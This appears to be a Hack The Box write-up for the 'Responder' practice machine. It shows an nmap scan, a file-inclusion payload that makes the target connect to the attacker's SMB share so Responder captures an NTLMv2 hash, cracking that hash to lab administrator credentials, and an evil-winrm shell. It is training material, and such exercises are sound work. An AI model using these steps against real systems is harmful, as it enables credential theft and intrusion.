# Responder (Very Easy)
- **IP Address:** '10.129.91.47'
- **OS:** Windows
- **Difficulty:** Very Easy
- **HTB Link:** [Machine Page](https://app.hackthebox.com/machines/responder)

---

## Enumeration 

### Nmap Scan

```
nmap -sC -sV -T5 -p- 10.129.91.47
```

### Open Ports & Services
#### Syntax: Port ; Service ; Version

80 ; http ; Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)

To access the webpage, had to add ```10.129.91.47   unika.htb``` to /etc/hosts

---

## Exploitation

There was a File Include vulnerability, which allowed me to add ```/?page=//[my ip]/somefile``` to and use responder to capture the NTLMv2 hash.

### Credential Discovery

Using the NTLMv2 hash, I used john to crack it and obtain the admin creds, Administrator:badminton

---

## Privilege Escalation

Used evil-winrm to get a administrator shell on the target machine, then ran ```Get-ChildItem -Recurse -File``` to find flag.txt

---

### [Flags](https://github.com/TianKwock/htb-flags/blob/main/README.md#responder)

---

## Lessons Learned

If a web page can't be found, try adding it to /etc/hosts

Even if 'allow_url_include' and 'allow_url_fopen' are set to Off in php.ini, PHP will not prevent the loading of SMB URLs, which can be used to steal an NTLM hash

---

Perceived Difficulty: Easy 

Time Taken: 35 min 

Date PWNED: 4/6/2026 
